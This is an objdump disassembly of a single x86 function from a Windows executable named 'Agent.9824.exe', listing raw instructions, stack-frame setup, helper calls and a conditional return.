
Agent.9824.exe:     file format pei-i386


Disassembly of section .text:

0071ec75 <.text+0x31dc75>:
  71ec75:	68 30 03 00 00       	push   0x330
  71ec7a:	b8 8b 2d 8f 00       	mov    eax,0x8f2d8b
  71ec7f:	e8 e7 73 15 00       	call   0x87606b
  71ec84:	8b d9                	mov    ebx,ecx
  71ec86:	89 9d c8 fc ff ff    	mov    DWORD PTR [ebp-0x338],ebx
  71ec8c:	8b 4d 08             	mov    ecx,DWORD PTR [ebp+0x8]
  71ec8f:	8b 45 10             	mov    eax,DWORD PTR [ebp+0x10]
  71ec92:	8b 7d 0c             	mov    edi,DWORD PTR [ebp+0xc]
  71ec95:	89 85 c4 fc ff ff    	mov    DWORD PTR [ebp-0x33c],eax
  71ec9b:	8b 44 cb 0c          	mov    eax,DWORD PTR [ebx+ecx*8+0xc]
  71ec9f:	89 8d cc fc ff ff    	mov    DWORD PTR [ebp-0x334],ecx
  71eca5:	3b c7                	cmp    eax,edi
  71eca7:	75 07                	jne    0x71ecb0
  71eca9:	33 c0                	xor    eax,eax
  71ecab:	e9 1f 01 00 00       	jmp    0x71edcf
  71ecb0:	57                   	push   edi
  71ecb1:	76 24                	jbe    0x71ecd7
  71ecb3:	50                   	push   eax
  71ecb4:	68 ac e7 9b 00       	push   0x9be7ac
  71ecb9:	6a 00                	push   0x0
  71ecbb:	68 08 bc 8f 00       	push   0x8fbc08
  71ecc0:	6a 04                	push   0x4
  71ecc2:	68 38 ba 9b 00       	push   0x9bba38
  71ecc7:	e8 77 4b 1a 00       	call   0x8c3843
  71eccc:	33 c0                	xor    eax,eax
  71ecce:	83 c4 1c             	add    esp,0x1c
  71ecd1:	40                   	inc    eax
  71ecd2:	e9 f8 00 00 00       	jmp    0x71edcf
  71ecd7:	51                   	push   ecx
  71ecd8:	8d 45 e0             	lea    eax,[ebp-0x20]
  71ecdb:	6a 0f                	push   0xf
  71ecdd:	50                   	push   eax
  71ecde:	e8 f0 03 00 00       	call   0x71f0d3
  71ece3:	8d 45 e0             	lea    eax,[ebp-0x20]
  71ece6:	50                   	push   eax
  71ece7:	ff 73 04             	push   DWORD PTR [ebx+0x4]
  71ecea:	8d 85 d4 fc ff ff    	lea    eax,[ebp-0x32c]
  71ecf0:	50                   	push   eax
  71ecf1:	e8 68 17 de ff       	call   0x50045e
  71ecf6:	83 c4 1c             	add    esp,0x1c
  71ecf9:	8d 8d d0 fc ff ff    	lea    ecx,[ebp-0x330]
  71ecff:	83 7b 08 02          	cmp    DWORD PTR [ebx+0x8],0x2
  71ed03:	6a 06                	push   0x6
  71ed05:	5e                   	pop    esi
  71ed06:	6a 04                	push   0x4
  71ed08:	58                   	pop    eax
  71ed09:	0f 44 f0             	cmove  esi,eax
  71ed0c:	e8 b3 08 01 00       	call   0x72f5c4
  71ed11:	33 db                	xor    ebx,ebx
  71ed13:	8d 85 d4 fc ff ff    	lea    eax,[ebp-0x32c]
  71ed19:	53                   	push   ebx
  71ed1a:	56                   	push   esi
  71ed1b:	50                   	push   eax
  71ed1c:	8d 85 d0 fc ff ff    	lea    eax,[ebp-0x330]
  71ed22:	89 5d fc             	mov    DWORD PTR [ebp-0x4],ebx
  71ed25:	50                   	push   eax
  71ed26:	e8 5c 62 14 00       	call   0x864f87
  71ed2b:	8b f0                	mov    esi,eax
  71ed2d:	83 c4 10             	add    esp,0x10
  71ed30:	85 f6                	test   esi,esi
  71ed32:	74 1a                	je     0x71ed4e
  71ed34:	8d 85 d4 fc ff ff    	lea    eax,[ebp-0x32c]
  71ed3a:	56                   	push   esi
  71ed3b:	50                   	push   eax
  71ed3c:	e8 39 03 00 00       	call   0x71f07a
  71ed41:	56                   	push   esi
  71ed42:	e8 da 84 ff ff       	call   0x717221
  71ed47:	83 c4 0c             	add    esp,0xc
  71ed4a:	8b d8                	mov    ebx,eax
  71ed4c:	eb 74                	jmp    0x71edc2
  71ed4e:	8b 85 c8 fc ff ff    	mov    eax,DWORD PTR [ebp-0x338]
  71ed54:	8b 8d cc fc ff ff    	mov    ecx,DWORD PTR [ebp-0x334]
  71ed5a:	89 7c c8 0c          	mov    DWORD PTR [eax+ecx*8+0xc],edi
  71ed5e:	83 c1 02             	add    ecx,0x2
  71ed61:	8d 34 c8             	lea    esi,[eax+ecx*8]
  71ed64:	8d 85 d0 fc ff ff    	lea    eax,[ebp-0x330]
  71ed6a:	8b ce                	mov    ecx,esi
  71ed6c:	50                   	push   eax
  71ed6d:	e8 13 5f 14 00       	call   0x864c85
  71ed72:	8b 8d c4 fc ff ff    	mov    ecx,DWORD PTR [ebp-0x33c]
  71ed78:	8b 85 c8 fc ff ff    	mov    eax,DWORD PTR [ebp-0x338]
  71ed7e:	ff 71 34             	push   DWORD PTR [ecx+0x34]
  71ed81:	ff 71 30             	push   DWORD PTR [ecx+0x30]
  71ed84:	ff b5 cc fc ff ff    	push   DWORD PTR [ebp-0x334]
  71ed8a:	ff 70 08             	push   DWORD PTR [eax+0x8]
  71ed8d:	56                   	push   esi
  71ed8e:	e8 bc ca 00 00       	call   0x72b84f
  71ed93:	8b f0                	mov    esi,eax
  71ed95:	85 f6                	test   esi,esi
  71ed97:	74 29                	je     0x71edc2
  71ed99:	56                   	push   esi
  71ed9a:	e8 d2 40 fe ff       	call   0x702e71
  71ed9f:	50                   	push   eax
  71eda0:	56                   	push   esi
  71eda1:	8d 85 d4 fc ff ff    	lea    eax,[ebp-0x32c]
  71eda7:	50                   	push   eax
  71eda8:	68 e8 e7 9b 00       	push   0x9be7e8
  71edad:	53                   	push   ebx
  71edae:	68 08 bc 8f 00       	push   0x8fbc08
  71edb3:	6a 04                	push   0x4
  71edb5:	68 38 ba 9b 00       	push   0x9bba38
  71edba:	e8 84 4a 1a 00       	call   0x8c3843
  71edbf:	83 c4 24             	add    esp,0x24
  71edc2:	8d 8d d0 fc ff ff    	lea    ecx,[ebp-0x330]
  71edc8:	e8 7d 5e 14 00       	call   0x864c4a
  71edcd:	8b c3                	mov    eax,ebx
  71edcf:	e8 46 72 15 00       	call   0x87601a
  71edd4:	c2 0c 00             	ret    0xc
